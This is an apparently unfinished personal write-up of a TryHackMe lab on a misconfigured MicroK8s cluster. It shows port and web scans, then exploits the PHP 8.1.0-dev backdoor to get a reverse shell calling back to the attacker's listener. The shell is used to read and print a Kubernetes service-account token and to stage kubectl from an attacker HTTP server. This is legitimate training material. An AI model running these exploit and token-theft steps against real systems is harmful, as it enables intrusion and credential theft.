<h1 align="center">Frank and Herby try again.....</h1>
<p align="center">2025, October 4<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>516</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Frank and Herby still don't know how to use kubernetes correctly.</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/9d256bcb-9e93-4043-8e79-98383fb65246"><br>
Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<br>
<img width="1200px" src=""></p>


<h1>Task 1 . You can do it!</h1>
<p>So Frank and Herb have become Kubernetes experts now and would never misconfigure their own deployment (agaun)!</p>

<p><em>Answer the questions below</em></p>

> 1.1. <em><strong>User</srong> flag?</em>
>> _________________________________
<br>

> 1.2. <em><strong>Root</strong> flag?</em>
>> _________________________________
<br>


<br>
<br>
<br>
<h1 align="center">Port Scanning</h1>
<p align="center"><strong>8</strong> open ports</p>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                     | **Certificate CN**      | **Evidences**                                                                                                                                             |
|-------------------:|:---------------------|:--------------------------------|:------------------------|:----------------------------------------------------------------------------------------------------------------------------------------------------------|
| `22`<br><br><br>   |`SSH`<br><br><br>     |OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |-<br><br><br>                  |Standard SSH banner confirms OpenSSH version.<br><br><br>                                                                                                  |
| `10250`<br><br><br>|`SSL/HTTP`<br><br><br>|Kubelet API<br><br><br>          |microk8s@1647797913<br><br><br>|Port 10250 is standard for Kubelet API. Golang net/http server and MicroK8s CN confirm node-level Kubernetes service.                                      |
| `10255`<br><br><br>|`HTTP`<br><br><br>    |Kubelet Read-Only API<br><br>    |-<br><br><br>                  |Port 10255 was used for Kubelet’s unauthenticated read-only endpoint. Golang net/http server matches legacy Kubelet behavior.                              |
| `10257`<br><br><br>|`SSL/HTTP`<br><br><br>|Kubernetes API server<br><br>    |localhost@1759612053<br><br><br>|JSON response with apiVersion:"v1" and RBAC denial. ALPN shows http/1.1 and h2. Matches Kubernetes API server behavior.                                    |
| `10259`<br><br><br>|`SSL/HTTP`<br><br><br>|Kubernetes API server<br><br>    |localhost@1759612058<br><br><br>|Identical response structure and RBAC error as 10257. Certificate CN differs, suggesting a separate instance of the same service.                          |
| `16443`<br><br><br>|`SSL/HTTP`<br><br><br>|Kubernetes API server<br><br>    |127.0.0.1, Canonical, GB<br><br>|JSON response with apiVersion:"v1" and 401 Unauthorized. SANs include kubernetes.default.svc.cluster.local—definitive for Kubernetes control plane.        |
| `25000`<br><br><br>|`SSL/HTTP`<br><br><br>|Gunicorn 19.7.1<br><br><br>      |127.0.0.1, Canonical, GB<br><br><br>|HTTP header confirms Gunicorn 19.7.1. Certificate SANs include Kubernetes DNS entries, suggesting Kubernetes-related traffic.                              |
| `30679`<br><br>    |`HTTP`<br><br>        |PHP CLI server<br><br>           |-<br>                           |HTTP banner confirms PHP CLI Server 5.5+ with version `PHP 8.1.0-dev`. Page title indicates custom `dev/test` page.                                        |

</p></div><br>


```bash
nmap -Pn -A -v --version-all -p- -oA nmap 10.201.46.77
```

```bash
:~# nmap -sT -p 22,3000,10250,10257,10259,16443,25000,31337,32000 -T4 10.201.46.77
...
PORT      STATE  SERVICE
22/tcp    open   ssh
3000/tcp  closed ppp
10250/tcp open   unknown
10257/tcp open   unknown
10259/tcp open   unknown
16443/tcp open   unknown
25000/tcp open   icl-twobase1
31337/tcp closed Elite
32000/tcp closed unknown
```

```bash
:~# nmap -T4 10.201.46.77 -p 25000-33000
PORT      STATE SERVICE
25000/tcp open  icl-twobase1
30679/tcp open  unknown
```

```bash
:~# nmap -sC -sV -Pn -p 30679 -T4 10.201.46.77
...
PORT      STATE SERVICE VERSION
30679/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title: FRANK RULEZZ!
```

```bash
:~# nmap -p 10000-32767 10.201.46.77
...
PORT      STATE SERVICE
10250/tcp open  unknown
10255/tcp open  unknown
10257/tcp open  unknown
10259/tcp open  unknown
16443/tcp open  unknown
25000/tcp open  icl-twobase1
30679/tcp open  unknown
```

```bash
:~# nmap -sC -sV -p 22,3000,10250,10255,10257,10259,16443,25000,30679 -T4 10.201.46.77
...
PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
3000/tcp  closed ppp
10250/tcp open   ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=microk8s@1647797913
| Subject Alternative Name: DNS:microk8s
| Not valid before: 2022-03-20T16:38:32
|_Not valid after:  2023-03-20T16:38:32
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10255/tcp open   http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10257/tcp open   ssl/unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 04 Oct 2025 21:56:42 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 04 Oct 2025 21:56:42 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1759612053
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2025-10-04T20:07:29
|_Not valid after:  2026-10-04T20:07:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10259/tcp open   ssl/unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 04 Oct 2025 21:56:42 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 04 Oct 2025 21:56:42 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1759612058
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2025-10-04T20:07:29
|_Not valid after:  2026-10-04T20:07:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
16443/tcp open   ssl/unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: b0f7c360-85d3-4ed1-a7ee-f7cd3225f59a
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 04 Oct 2025 21:57:07 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 20349459-b606-4e6d-9833-1265e472c3e9
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 04 Oct 2025 21:56:42 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 67fba31f-3155-4d8d-9e49-96d2bb18835f
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 04 Oct 2025 21:56:42 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.201.46.77
| Not valid before: 2025-10-04T21:05:46
|_Not valid after:  2026-10-04T21:05:46
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
25000/tcp open   ssl/http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.201.46.77
| Not valid before: 2025-10-04T21:05:46
|_Not valid after:  2026-10-04T21:05:46
30679/tcp open   http        PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title: FRANK RULEZZ!
```

<h2>Vulnerability Assessment</h2>

```bash
:~# nikto -h 10.201.46.77:30679
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.46.77
+ Target Hostname:    10.201.46.77
+ Target Port:        30679
+ Start Time:         2025-10-04 22:34:40 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: PHP/8.1.0-dev
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-27071: /phpimageview.php?pic=javascript:alert(8754): PHP Image View 1.0 is vulnerable to Cross Site Scripting (XSS).  http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-3931: /myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent: myphpnuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ /modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ /modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-4598: /members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-2946: /forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-18114: /reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF:  Oracle Reports rwservlet report Variable Arbitrary Report Executable Execution
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 6544 items checked: 24 error(s) and 11 item(s) reported on remote host
+ End Time:           2025-10-04 22:34:55 (GMT1) (15 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h2>Content Discovery</h2>

```bash
root@ip-10-201-105-176:~# dirsearch -u https://10.201.46.77:10250/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/https_10.201.46.77_10250/__25-10-04_22-23-11.txt

Target: https://10.201.46.77:10250/

[22:23:11] Starting: 
[22:23:12] 301 -   46B  - /%2e%2e//google.com  ->  /google.com
[22:23:12] 301 -   46B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
[22:23:40] 401 -   12B  - /attach
[22:23:41] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
[22:23:41] 301 -   54B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp
[22:23:41] 301 -   59B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
[22:23:45] 301 -   46B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
[22:23:46] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
[22:23:53] 401 -   12B  - /debug/pprof/goroutine?debug=1
[22:23:53] 301 -   48B  - /debug/pprof  ->  /debug/pprof/
[22:23:53] 401 -   12B  - /debug/pprof/heap
[22:23:53] 401 -   12B  - /debug/pprof/trace
[22:23:53] 401 -   12B  - /debug/pprof/
[22:23:53] 401 -   12B  - /debug/pprof/profile
[22:23:56] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
[22:23:56] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
[22:23:58] 401 -   12B  - /exec
[22:23:58] 301 -   62B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
[22:24:03] 401 -   12B  - /healthz
[22:24:04] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
[22:24:14] 401 -   12B  - /logs/access.log
[22:24:14] 301 -   41B  - /logs  ->  /logs/
[22:24:15] 401 -   12B  - /logs/error_log
[22:24:15] 401 -   12B  - /logs/mail.log
[22:24:15] 401 -   12B  - /logs/access_log
[22:24:15] 401 -   12B  - /logs/proxy_access_ssl_log
[22:24:15] 401 -   12B  - /logs/
[22:24:15] 401 -   12B  - /logs/liferay.log
[22:24:14] 401 -   12B  - /logs/error.log
[22:24:15] 401 -   12B  - /logs/wsadmin.traceout
[22:24:15] 401 -   12B  - /logs/proxy_error_log
[22:24:15] 401 -   12B  - /logs/www-error.log
[22:24:15] 401 -   12B  - /logs/errors.log
[22:24:18] 401 -   12B  - /metrics
[22:24:36] 401 -   12B  - /pods
[22:24:43] 401 -   12B  - /run
[22:24:53] 401 -   12B  - /stats/
[22:24:53] 301 -   42B  - /stats  ->  /stats/

Task Completed
```


<h2>:30679</h2>

<img width="936" height="247" alt="image" src="https://github.com/user-attachments/assets/4f702bb7-0012-4c1e-b2f6-e48501897789" />

<br>
<br>
<br>
<p>
    
- Viewed Page Source</p>

```bash
FRANK RULEZZ!

FRANK's WORLD DOMINATION RESTART!

There is no way they will break in this time!
<p>This site is built with STATE-OF-THE-ART PHP!! The greatest programming language ever created!</p>
    <p>Also powered by the most advanced and inheirantly secure app deployment technology:</p>
    <h1>KUBERNETES!!!!!!</h1>
    <p>Using the power of KUBECTL!!!</p>
    <p>Pronounced: KUBE + CONTROL! NOT KUBE + CUDDLE!</p>
    <p>
        <marquee>Because I CONTROL the KUBE! I don't CUDDLE it!</marquee>
```


<h2> ____</h2>

```bash
:~# searchsploit php 8.1.0-dev
```

```bash
:~# searchsploit -m php/webapss/49933.py
```

<img width="1221" height="593" alt="image" src="https://github.com/user-attachments/assets/172dbbb4-c5e9-4f42-a769-97ea2bedc30f" />

<br>
<br>
<br>

```bash
:~# git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce
```

```bash
:~# nc -nlvp 9001
Listening on 0.0.0.0 9001
```

```bash
:~# python3 revshell_php_8.1.0-dev.py http://10.201.49.183:30679 10.201.39.157 9001
```

<h2>Shell as root@php-deploy-...</h2>

```bash
:~# nc -nlvp 9001
...
root@php-deploy-6d998f68b9-c2fdc:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
root@php-deploy-6d998f68b9-c2fdc:/var/www/html# 
```

```bash
root@php-deploy-6d998f68b9-c2fdc:/var/www/html# find / type -name *.io 2>/dev/null
<c:/var/www/html# find / type -name *.io 2>/dev/null
/run/secrets/kubernetes.io
```

```bash
root@php-deploy-6d998f68b9-c2fdc:/run/secrets# ls -lah
ls -lah
total 12K
drwxr-xr-x 3 root root 4.0K Oct  5 01:46 .
drwxr-xr-x 1 root root 4.0K Oct  5 01:46 ..
drwxr-xr-x 3 root root 4.0K Oct  5 01:46 kubernetes.io
```

```bash
root@php-deploy-6d998f68b9-c2fdc:/run/secrets# ls -lah
ls -lah
total 12K
drwxr-xr-x 3 root root 4.0K Oct  5 01:46 .
drwxr-xr-x 1 root root 4.0K Oct  5 01:46 ..
drwxr-xr-x 3 root root 4.0K Oct  5 01:46 kubernetes.io
```

<p>

- set up an HTTP server</p>

```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<p>
    
- Crafted a File Upload Script</p>

```bash
echo '<?php $target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) { echo "File is an image - " . $check["mime"] . ".";  $uploadOk = 1;  } else {  echo "File is not an image.";  $uploadOk = 0;  }}?>'
```

```bash
root@php-deploy-6d998f68b9-c2fdc:/var/www/html# echo '<?php $target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) { echo "File is an image - " . $check["mime"] . ".";  $uploadOk = 1;  } else {  echo "File is not an image.";  $uploadOk = 0;  }}?>' > hi.php
```

```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.46.77 - - [05/Oct/2025 xx:xx:xx] "GET /kubectl HTTP/1.1." 200 -
```

<p>

- navigated to :30679/hi.php</p>

```bash
root@php-deploy-6d998f68b9-c2fdc:/var/www/html# ls -la
...
-rw-r--r-- 1 root root 49864704 Oct 5  xx:xx kubectl
-rw-r--r-- 1 root root      438 Oct 5  xx:xx hi.php
```

<p>Web page output:<br>

- <strong>Warning</strong>: Undefined array key "fileToUpload" in <strong>/var/www/html/hi.php</strong> on line <strong>1</strong><br>
- <strong>Warning</strong>: Trying to access array offset on value of type null in <strong>/var/www/html/hi.php</strong> on line <strong>1</strong><br>
- <strong>Deprecated</strong>: basename(): Passing null to parameter #1 ($path) of type string is deprecated in <strong>/var/www/html/x.php</strong> on line <strong>1</strong></p>


```bash
root@php-deploy-6d998f68b9-c2fdc:/var/www/html#  exit
```




```bash
/tmp# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

```bash
/tmp# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl.sha256"
```

```bash
:/tmp# echo "$(cat kubectl.sha256)  kubectl" | sha256sum --check
kubectl: OK
```












https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py

https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py










https://www.exploit-db.com/exploits/49933


https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py





root@ip-10-201-105-176:~# python3 revshell_php_8.1.0-dev.py http://10.201.46.77:30679/ 10.201.105.176 1337




root@ip-10-201-105-176:~# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.201.46.77 23354
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@php-deploy-6d998f68b9-4tg2g:/var/www/html# whoami
whoami
root
root@php-deploy-6d998f68b9-4tg2g:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
root@php-deploy-6d998f68b9-4tg2g:/var/www/html# pwd             
pwd
/var/www/html
root@php-deploy-6d998f68b9-4tg2g:/var/www/html# cd /run/secrets/kubernetes.io/serviceaccount
</html# cd /run/secrets/kubernetes.io/serviceaccount
root@php-deploy-6d998f68b9-4tg2g:/run/secrets/kubernetes.io/serviceaccount# 
root@php-deploy-6d998f68b9-4tg2g:/run/secrets/kubernetes.io/serviceaccount# cat namespace
<secrets/kubernetes.io/serviceaccount# cat namespace                        
root@php-deploy-6d998f68b9-4tg2g:/run/secrets/kubernetes.io/serviceaccount# cat token
<run/secrets/kubernetes.io/serviceaccount# cat token                        
eyJhbGciOiJSUzI1NiIsImtpZCI6Img4TVpFMFp0RTlrc3NCdlpyT25fcEVZVzYyWm1CVWtlZTY2dC1OUjJhcmMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc5MTE1MTMzMCwiaWF0IjoxNzU5NjE1MzMwLCJpc3MiOiJodHRwczovL2t1YmVybmV0ZXMuZGVmYXVsdC5zdmMiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImZyYW5rbGFuZCIsInBvZCI6eyJuYW1lIjoicGhwLWRlcGxveS02ZDk5OGY2OGI5LTR0ZzJnIiwidWlkIjoiOGZjZmY4MmQtODEyZS00Yzk0LTk3NTMtNjJmN2VmNTQ4ZDYxIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiNmZhYmRmYzUtYzIwYS00ZDc1LWI2ZWItZTY4NTZlMDhhOTE3In0sIndhcm5hZnRlciI6MTc1OTYxODkzN30sIm5iZiI6MTc1OTYxNTMzMCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmZyYW5rbGFuZDpkZWZhdWx0In0.KIa9KwP-3cwJ6m-4qUnrOqQ3G-a1-klkUlCXzZ-fJIf2dE7oyTRlxLIXv_V1xvkzuXz355G-zwJQD5I0J25Dpnbu8nU_eVkZ2g2S-XUlK3goET7ThTfodufI-U5J1IW9YqLlT21yyxKy2AMyt3CRgd5dyDsy1598TxHOnIZJf7BpodDWm7mG5mVlGhMpxuYyY4H_pWlZjl1gvNrB6VLbJfBSe4XQaaF-LXbWGZ6KNk3oGhciQr_l2GOsbv2Lc9sbpk4xtP4liqWIlz6od9xqTQGXNyazUwEUpOv8-A7qdUKYTJMDccrcgGRoy_VSAgcrWOGydYj6qsj-7_T_DbLvbQroot@php-deploy-6d998f68b9-4tg2g:/run/secrets/kubernetes.io/serviceaccount# 
root@php-deploy-6d998f68b9-4tg2g:/run/secrets/kubernetes.io/serviceaccount# env | grep KUBERNETES
<kubernetes.io/serviceaccount# env | grep KUBERNETES                        
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.152.183.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.152.183.1
KUBERNETES_SERVICE_HOST=10.152.183.1
KUBERNETES_PORT=tcp://10.152.183.1:443
KUBERNETES_PORT_443_TCP_PORT=443
root@php-deploy-6d998f68b9-4tg2g:/run/secrets/kubernetes.io/serviceaccount# 














Navigated to 10.201.46.77:10255/pods


/var/run/secrets/kubernetes.io/serviceaccount

<img width="1136" height="103" alt="image" src="https://github.com/user-attachments/assets/7edd1cf0-1b61-4f5d-9fda-634c0c2b4367" />


10.1.102.194/32

podIP: 10.1.102.194

/var/snap/microk8s/current/var/run/calico

10.1.102.193
10.1.102.95
10.1.102.193/32
10.1.102.195/32

host-local-net-dir   :   /var/lib/cni/networks
cni-bin-dir  :  /host/opt/cni/bin
ube-api-access-nrplz : /var/run/secrets/kubernetes.io/serviceaccount


name: FELIX_IPINIPMTU
key: veth_mtu



/var/snap/microk8s/current/var/run/calico
/var/snap/microk8s/current/var/lib/calico
xtables-lock
/run/xtables.lock
var/snap/microk8s/current/opt/cni/bin
/var/snap/microk8s/current/args/cni-networks
/var/snap/microk8s/current/var/lib/cni/networks
/var/snap/microk8s/current/var/run/nodeagent
/usr/libexec/kubernetes/kubelet-plugins/volume/exec/nodeagent~uds

<img width="1225" height="420" alt="image" src="https://github.com/user-attachments/assets/0b543189-b54c-40e8-869a-bbe632032a90" />

<img width="1133" height="527" alt="image" src="https://github.com/user-attachments/assets/9c3bcdd7-8879-4d46-b9ee-6f81f7c3b066" />






```bash

```



